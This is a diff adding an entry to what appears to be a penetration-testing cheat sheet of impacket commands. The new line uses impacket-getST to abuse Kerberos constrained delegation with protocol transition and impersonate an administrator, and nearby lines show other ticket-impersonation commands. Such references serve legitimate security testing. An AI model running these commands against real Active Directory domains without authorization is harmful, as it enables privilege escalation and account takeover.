@@ -56,6 +56,12 @@ impacket-ticketConverter <ccache_ticket_file> <ticket_kirbi_file>
 impacket-getST -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user>
 ```
 
+## Constrained deleg w/ protocol transition - impersonate user
+#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
+```
+impacket-getST -dc-ip <dc_ip> -spn cifs/<target> '<domain>/<user>:<password>' -impersonate <admin>
+```
+
 ## GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey
 #plateform/linux #target/remote  #cat/UTILS
 ```
